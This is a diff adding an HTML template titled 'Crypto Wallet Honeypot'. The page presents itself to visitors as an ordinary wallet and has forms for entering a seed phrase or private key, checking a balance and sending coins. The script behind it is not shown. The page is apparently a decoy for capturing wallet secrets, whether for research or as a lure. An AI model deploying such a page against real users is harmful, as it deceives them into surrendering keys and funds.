@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Honeypot</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Wallet</h1>
+        <div id="import-section">
+            <h2>Import Wallet</h2>
+            <form id="import-form">
+                <label>Wallet Type:
+                    <select name="wallet_type">
+                        <option value="seed">Seed Phrase</option>
+                        <option value="private">Private Key</option>
+                    </select>
+                </label><br>
+                <label>Credential:
+                    <input type="text" name="credential" id="credential-input" required>
+                </label><br>
+                <button type="submit">Import</button>
+            </form>
+            <div id="import-result"></div>
+        </div>
+        <div id="balance-section">
+            <h2>Balance</h2>
+            <button id="get-balance">Get Balance</button>
+            <div id="balance-result"></div>
+        </div>
+        <div id="send-section">
+            <h2>Send Coins</h2>
+            <form id="send-form">
+                <label>To Address:
+                    <input type="text" name="to_address" required>
+                </label><br>
+                <label>Amount:
+                    <input type="number" name="amount" step="0.0001" required>
+                </label><br>
+                <label>Credential:
+                    <input type="text" name="credential" required>
+                </label><br>
+                <button type="submit">Send</button>
+            </form>
+            <div id="send-result"></div>
+        </div>
+    </div>
+    <script src="/static/app.js"></script>
+</body>
+</html>
